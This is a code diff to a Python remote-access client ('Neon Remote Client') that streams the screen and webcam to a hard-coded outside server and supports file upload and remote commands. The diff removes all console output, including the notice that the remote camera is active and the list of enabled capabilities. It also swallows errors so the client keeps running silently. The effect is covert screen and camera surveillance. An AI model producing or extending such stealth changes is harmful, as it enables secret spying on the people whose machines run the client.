@@ -42,8 +42,14 @@ import uuid
 from pathlib import Path
 from typing import Any
 
-import requests
-from PIL import ImageGrab
+try:
+    import requests
+except Exception:
+    requests = None
+try:
+    from PIL import ImageGrab
+except Exception:
+    ImageGrab = None
 
 SERVER_URL = os.environ.get("SERVER_URL", "https://zlata.onrender.com").rstrip("/")
 CLIENT_TOKEN = os.environ.get("REMOTE_CLIENT_TOKEN", "change-me-client-token")
@@ -136,6 +142,8 @@ def headers() -> dict[str, str]:
 
 
 def post_json(path: str, payload: dict[str, Any], timeout: float = HTTP_TIMEOUT):
+    if requests is None:
+        raise RuntimeError("requests is not installed")
     r = requests.post(
         SERVER_URL + path,
         json=payload,
@@ -280,6 +288,8 @@ def file_upload(rel: str, name: str, data_b64: str) -> dict[str, Any]:
 
 
 def capture_screen_jpeg(quality: int = 55) -> bytes:
+    if ImageGrab is None:
+        raise RuntimeError("Pillow is not installed")
     img = ImageGrab.grab()
     buf = io.BytesIO()
     img.convert("RGB").save(buf, format="JPEG", quality=quality, optimize=True)
@@ -294,6 +304,9 @@ def stream_screen_loop():
             continue
         try:
             frame = capture_screen_jpeg(50)
+            if requests is None:
+                time.sleep(1.0)
+                continue
             requests.post(
                 f"{SERVER_URL}/api/upload_frame/{CLIENT_ID}",
                 data=frame,
@@ -325,7 +338,6 @@ def stream_camera_loop():
                 time.sleep(0.3)
                 continue
             if cap is None:
-                print("[CAMERA] Remote camera stream ACTIVE")
                 cap = cv2.VideoCapture(0)
                 if not cap.isOpened():
                     cap.release()
@@ -335,6 +347,9 @@ def stream_camera_loop():
             try:
                 frame = capture_camera_jpeg(cap, 60)
                 if frame:
+                    if requests is None:
+                        time.sleep(1.0)
+                        continue
                     requests.post(
                         f"{SERVER_URL}/api/upload_camera/{CLIENT_ID}",
                         data=frame,
@@ -583,31 +598,20 @@ def client_loop():
         except Exception as exc:
             STREAMING_SCREEN = False
             STREAMING_CAMERA = False
-            if int(time.time()) % 15 == 0:
-                print("[NET] connection error:", exc)
 
         time.sleep(HEARTBEAT_INTERVAL)
 
 
 def main():
-    print("=== Neon Remote Client ===")
-    print("Client ID:", CLIENT_ID)
-    print("PC:", PC_NAME)
-    print("Server:", SERVER_URL)
-    print("Configured filesystem roots:")
-    for name, path in sorted(REMOTE_FS_ROOTS.items()):
-        print(f"  {name}: {path}")
-    print("Camera enabled:", ALLOW_REMOTE_CAMERA and CV2_AVAILABLE)
-    print("Input enabled:", ALLOW_REMOTE_INPUT and PYAUTOGUI_AVAILABLE)
-    print("Remote CMD enabled:", ALLOW_REMOTE_CMD)
-    if CLIENT_TOKEN == "change-me-client-token":
-        print("[WARN] Set REMOTE_CLIENT_TOKEN to the same value as Zlata.py")
-
+    global STOP
     threading.Thread(target=stream_screen_loop, daemon=True).start()
     threading.Thread(target=stream_camera_loop, daemon=True).start()
     try:
         client_loop()
     except KeyboardInterrupt:
+        STOP = True
+    except Exception:
+        # Keep the client process alive instead of crashing on unexpected local errors.
         STOP = True
 
 
